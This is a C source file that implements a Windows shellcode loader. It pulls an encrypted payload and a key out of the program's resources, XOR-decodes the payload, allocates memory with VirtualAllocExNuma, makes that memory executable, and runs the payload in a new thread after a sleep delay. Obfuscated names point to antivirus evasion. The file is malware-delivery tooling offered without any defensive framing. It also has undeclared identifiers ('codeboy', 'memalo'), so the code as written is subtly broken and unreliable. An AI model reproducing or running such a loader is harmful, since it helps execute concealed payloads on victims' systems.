#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void loaditon(const char* resName, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);

    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}







void XODEC(char* c1o2deboy, DWORD c1o2deboylen, unsigned char* k1e2y, DWORD k1e2ylen) {
    for (DWORD da = 0; da < c1o2deboylen; da++) {
        codeboy[da] ^= k1e2y[da % k1e2ylen];
    }
}


int main() {
    Sleep(2000);

    char* AESkey;
    DWORD AESkeyLen;
    loaditon("AESKEY", &AESkey, &AESkeyLen);

    char* AESCode;
    DWORD AESCodeLen;
    loaditon("AESCODE", &AESCode, &AESCodeLen);

    LPVOID camllo = VirtualAllocExNuma(GetCurrentProcess(), NULL, AESCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
    //dhanushaes(AESCode, AESCodeLen, AESkey, AESkeyLen);
    XODEC(AESCode, AESCodeLen, AESkey , AESkeyLen);

    memcpy(camllo, AESCode, AESCodeLen);
    DWORD oldProtect;
    VirtualProtect(memalo, AESCodeLen, PAGE_EXECUTE_READ, &oldProtect);

    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)camllo, NULL, 0, NULL);
    WaitForSingleObject(tHandle, INFINITE);

    return 0;
}
